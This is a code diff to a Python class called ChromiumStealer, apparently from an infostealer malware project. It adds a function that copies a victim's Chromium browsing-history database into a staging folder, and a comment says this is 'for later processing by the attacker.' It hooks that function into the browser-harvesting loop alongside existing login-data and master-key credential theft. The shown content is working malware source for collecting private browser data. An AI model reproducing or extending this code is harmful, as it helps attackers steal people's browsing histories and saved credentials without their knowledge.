@@ -28,7 +28,6 @@ SOFTWARE.
 """
 
 
-
 import os
 import json
 import base64
@@ -113,7 +112,6 @@ class ChromiumStealer(ModuleManager):
 
 
     def get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
-        print(browser_name, profile, path)
         result = ""
         login_db = f'{path}\\{profile}\\Login Data'
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
@@ -205,6 +203,43 @@ class ChromiumStealer(ModuleManager):
         conn.close()
         return result
 
+    def get_web_history(self, path: str, profile: str, browser_name: str) -> str:
+        result = ""
+        web_history_db = f'{path}\\{profile}\\History'
+        copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
+        
+        if not os.path.exists(web_history_db):
+            return
+        if not os.path.isdir(copy_path):
+            os.makedirs(copy_path)
+
+        copy_path = os.path.join(copy_path, 'history.db')
+        if os.path.isfile(copy_path):
+            os.remove(copy_path)
+
+        shutil.copy(web_history_db, copy_path)
+        
+        # ????????????? NOTE ?????????????
+        # If you wish to process history and then save this old way
+        # Which is very slow, uncomment this code
+        # This function only copies the DB for later processing by the attacker
+        # as it is very fast
+        
+        # -----------
+        # conn = sqlite3.connect(copy_path)
+        # cursor = conn.cursor()
+        # cursor.execute('SELECT url, title, last_visit_time FROM urls')
+        
+        # for row in cursor.fetchall():
+        #     if not row[0] or not row[1] or not row[2]:
+        #         continue
+        #     result += f"""\nURL: {row[0]}\nTitle: {row[1]}\nVisited Time: {row[2]}"""
+            
+        # conn.close()
+        # -----------
+        
+        return result
+
 
     def installed_browsers(self):
         results = []
@@ -254,4 +289,26 @@ class ChromiumStealer(ModuleManager):
                         browser_name=browser
                     ), profile
                 )
-        
+                
+                self.get_web_history(
+                    path=browser_path, 
+                    browser_name=browser, 
+                    profile=profile
+                )
+                
+                
+                # ????????????? NOTE ?????????????
+                # If you wish to process history and then save this old way
+                # Which is very slow, uncomment this code
+                
+                # -----------
+                # self.save_results(
+                #     browser, 'history', 
+                #     self.get_web_history(
+                #         path=browser_path, 
+                #         browser_name=browser, 
+                #         profile=profile
+                #     ), profile
+                # )
+                # -----------
+                
